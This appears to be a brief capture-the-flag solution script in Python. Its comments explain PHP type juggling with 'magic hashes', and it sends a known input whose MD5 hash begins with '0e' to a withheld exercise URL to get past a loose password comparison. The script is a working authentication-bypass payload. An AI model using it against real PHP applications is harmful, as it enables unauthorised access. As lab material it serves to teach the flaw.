import requests

# helpful1: https://www.whitehatsec.com/blog/magic-hashes/
# helpful2: https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf
# in php's lose coupling comparison, data starting with 0e means that if the following characters are all digits the whole string gets treated as a float.
# to catch the flag, we need to find a word which is md5ed to a hash starting with 0e

# url to the security exercise cannot be shared with public
url = "enterurlhere"

# set a string that is md5ed to something starting with 0e
params = {'pw': '240610708'}

# send pw to url
r = requests.get(url, params=params)

print(r.status_code)
print(r.headers)
print(r.content)

